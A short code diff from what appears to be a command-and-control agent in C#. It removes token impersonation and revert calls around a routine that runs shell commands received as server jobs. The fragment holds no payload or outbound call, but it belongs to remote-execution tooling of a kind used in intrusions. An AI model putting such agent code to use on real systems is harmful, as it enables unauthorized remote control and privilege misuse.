@@ -18,11 +18,6 @@ namespace Agent
     }
         public async Task Execute(ServerJob job)
         {
-            if (job.task.token != 0)
-            {
-                tokenManager.Impersonate(job.task.token);
-            }
-
             string shell = String.Empty;
 
 
@@ -54,10 +49,6 @@ namespace Agent
             ProcessRunner runner = new ProcessRunner(shell, job.task.id, messageManager);
             runner.Start();
             runningProcs.Add(job.task.id, runner);
-            if (job.task.token != 0)
-            {
-                tokenManager.Revert();
-            }
         }
 
 
